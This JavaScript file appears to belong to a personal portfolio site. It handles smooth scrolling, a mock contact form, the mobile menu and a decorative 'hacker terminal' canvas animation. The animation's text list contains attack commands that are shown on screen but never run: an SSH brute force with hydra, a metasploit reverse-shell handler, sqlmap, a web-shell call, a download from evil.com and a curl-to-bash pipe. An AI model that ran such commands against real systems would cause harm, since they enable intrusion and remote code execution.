// Smooth scrolling for navigation links
document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function (e) {
        e.preventDefault();
        document.querySelector(this.getAttribute('href')).scrollIntoView({
            behavior: 'smooth'
        });
    });
});

// Form submission handling
const contactForm = document.getElementById('contact-form');
if (contactForm) {
    contactForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        // Get form data
        const formData = new FormData(this);
        const data = Object.fromEntries(formData);
        
        // Here you would typically send the data to a server
        console.log('Form submitted:', data);
        
        // Show success message
        alert('Thank you for your message! I will get back to you soon.');
        this.reset();
    });
}

// Navbar transparency handling
document.addEventListener('DOMContentLoaded', () => {
    const header = document.querySelector('header');
    const nav = document.querySelector('nav');
    
    window.addEventListener('scroll', () => {
        if (window.scrollY > 50) {
            header.classList.add('scrolled');
            nav.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
            nav.classList.remove('scrolled');
        }
    });
});

// Mobile Menu Functionality
const mobileMenuBtn = document.querySelector('.mobile-menu-btn');
const closeMenuBtn = document.querySelector('.close-menu-btn');
const mobileNav = document.querySelector('.mobile-nav');

mobileMenuBtn.addEventListener('click', () => {
    mobileNav.classList.add('active');
    document.body.style.overflow = 'hidden'; // Prevent scrolling when menu is open
});

closeMenuBtn.addEventListener('click', () => {
    mobileNav.classList.remove('active');
    document.body.style.overflow = ''; // Restore scrolling
});

// Close mobile menu when clicking on a link
const mobileNavLinks = document.querySelectorAll('.mobile-nav-links a');
mobileNavLinks.forEach(link => {
    link.addEventListener('click', () => {
        mobileNav.classList.remove('active');
        document.body.style.overflow = '';
    });
});

// Close mobile menu when clicking outside
document.addEventListener('click', (e) => {
    if (mobileNav.classList.contains('active') && 
        !mobileNav.contains(e.target) && 
        !mobileMenuBtn.contains(e.target)) {
        mobileNav.classList.remove('active');
        document.body.style.overflow = '';
    }
});

class TerminalAnimation {
    constructor(canvas) {
        this.canvas = canvas;
        this.ctx = canvas.getContext('2d');
        this.terminals = [];
        this.maxTerminals = 36;
        this.lastTime = 0;
        this.terminalInterval = 142;  // Changed to 142ms for exactly 7 terminals per second (1000ms/7 ≈ 142ms)
        
        // Create 36 positions in a grid-like pattern
        this.positions = [];
        
        // Generate positions in a 6x6 grid
        const rows = 6;
        const cols = 6;
        const paddingX = 50;
        const paddingY = 50;
        
        for (let row = 0; row < rows; row++) {
            for (let col = 0; col < cols; col++) {
                const x = paddingX + (col * (this.canvas.width - 2 * paddingX) / (cols - 1));
                const y = paddingY + (row * (this.canvas.height - 2 * paddingY) / (rows - 1));
                // Add some random offset to make it less grid-like
                const offsetX = (Math.random() - 0.5) * 50;
                const offsetY = (Math.random() - 0.5) * 50;
                this.positions.push({
                    x: x + offsetX,
                    y: y + offsetY
                });
            }
        }
        
        // Terminal commands and code snippets
        this.codeSnippets = [
            "sudo nmap -sV -sC -p- 192.168.1.0/24",
            "hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1",
            "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp;'",
            "gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt",
            "sqlmap -u 'http://target.com/page.php?id=1' --dbs",
            "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
            "airmon-ng start wlan0",
            "tcpdump -i eth0 -w capture.pcap",
            "python3 exploit.py -t 10.0.0.1 -p 4444",
            "curl -X POST -d 'cmd=whoami' http://target.com/shell.php",
            "tcpdump -ieth0port80",
            "nc-nlvp4444",
            "telnet<9000><127.0.0.1>",
            "ping-c4<127.0.0.1>",
            "traceroute<127.0.0.1>",
            "wgethttp://evil.com/shell.sh",
            "curlhttp://127.0.0.1:8000/shell.sh|bash",
        ];
        
        // Set canvas size
        this.resize();
        window.addEventListener('resize', () => this.resize());
        
        // Start animation
        this.animate();
    }
    
    resize() {
        this.canvas.width = window.innerWidth;
        this.canvas.height = window.innerHeight;
        
        // Regenerate positions on resize
        this.positions = [];
        const rows = 6;
        const cols = 6;
        const paddingX = 50;
        const paddingY = 50;
        
        for (let row = 0; row < rows; row++) {
            for (let col = 0; col < cols; col++) {
                const x = paddingX + (col * (this.canvas.width - 2 * paddingX) / (cols - 1));
                const y = paddingY + (row * (this.canvas.height - 2 * paddingY) / (rows - 1));
                // Add some random offset to make it less grid-like
                const offsetX = (Math.random() - 0.5) * 50;
                const offsetY = (Math.random() - 0.5) * 50;
                this.positions.push({
                    x: x + offsetX,
                    y: y + offsetY
                });
            }
        }
    }
    
    getRandomPosition() {
        // Get a random position that's not currently in use
        const usedPositions = this.terminals.map(t => t.positionIndex);
        const availablePositions = this.positions
            .map((pos, index) => ({ pos, index }))
            .filter(({ index }) => !usedPositions.includes(index));
        
        if (availablePositions.length === 0) return null;
        
        const randomIndex = Math.floor(Math.random() * availablePositions.length);
        return availablePositions[randomIndex];
    }
    
    createTerminal() {
        const position = this.getRandomPosition();
        if (!position) return null;
        
        // Determine if this terminal should be red (3 out of 7)
        const shouldBeRed = (this.terminals.length % 7) < 3;
        
        const terminal = {
            x: position.pos.x,
            y: position.pos.y,
            positionIndex: position.index,
            width: 350,
            height: 150,
            text: "",
            targetText: this.codeSnippets[Math.floor(Math.random() * this.codeSnippets.length)],
            progress: 0,
            speed: Math.random() * 0.05 + 0.02,
            cursorBlink: 0,
            state: 'typing',
            waitTime: 0,
            color: shouldBeRed ? 
                `rgba(255, 0, 0, ${Math.random() * 0.3 + 0.7})` :  // Red color
                `rgba(0, 255, 0, ${Math.random() * 0.3 + 0.7})`    // Green color
        };
        return terminal;
    }
    
    drawTerminal(terminal) {
        // Draw text only
        this.ctx.font = '14px "Courier New", monospace';
        this.ctx.fillStyle = terminal.color;
        
        const text = terminal.text;
        const lines = text.split('\n');
        const lineHeight = 20;
        
        lines.forEach((line, index) => {
            this.ctx.fillText(line, terminal.x + 10, terminal.y + 25 + (index * lineHeight));
        });
        
        // Draw cursor
        if (terminal.state === 'typing' || terminal.state === 'waiting') {
            const cursorX = terminal.x + 10 + this.ctx.measureText(text).width;
            const cursorY = terminal.y + 25;
            
            if (terminal.cursorBlink < 0.5) {
                this.ctx.fillStyle = terminal.color;
                this.ctx.fillRect(cursorX, cursorY - 14, 8, 2);
            }
        }
    }
    
    update(time) {
        // Clear canvas with fade effect
        this.ctx.fillStyle = 'rgba(0, 0, 0, 0.1)';
        this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
        
        // Add new terminals
        if (time - this.lastTime > this.terminalInterval) {
            if (this.terminals.length < this.maxTerminals) {
                const newTerminal = this.createTerminal();
                if (newTerminal) {
                    this.terminals.push(newTerminal);
                }
            }
            this.lastTime = time;
        }
        
        // Update and draw terminals
        this.terminals = this.terminals.filter(terminal => {
            // Update cursor blink
            terminal.cursorBlink = (terminal.cursorBlink + 0.1) % 1;
            
            // Update terminal state
            switch(terminal.state) {
                case 'typing':
                    if (terminal.progress < 1) {
                        terminal.progress += terminal.speed;
                        terminal.text = terminal.targetText.substring(0, Math.floor(terminal.targetText.length * terminal.progress));
                    } else {
                        terminal.state = 'waiting';
                        terminal.waitTime = time;
                    }
                    break;
                    
                case 'waiting':
                    if (time - terminal.waitTime > 2000) {
                        terminal.state = 'erasing';
                        terminal.progress = 1;
                    }
                    break;
                    
                case 'erasing':
                    terminal.progress -= terminal.speed * 0.5;
                    terminal.text = terminal.targetText.substring(0, Math.floor(terminal.targetText.length * terminal.progress));
                    if (terminal.progress <= 0) {
                        // Instead of continuing at the same position, remove this terminal
                        return false;
                    }
                    break;
            }
            
            this.drawTerminal(terminal);
            return true;
        });
    }
    
    animate(time = 0) {
        this.update(time);
        requestAnimationFrame((t) => this.animate(t));
    }
}

// Initialize terminal animation for hero section
function initTerminalAnimation() {
    const heroSection = document.querySelector('.hero');
    if (!heroSection) return;
    
    const canvas = document.createElement('canvas');
    canvas.id = 'terminal-canvas';
    heroSection.appendChild(canvas);
    
    new TerminalAnimation(canvas);
}

// Initialize terminal animation when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    initTerminalAnimation();
}); 

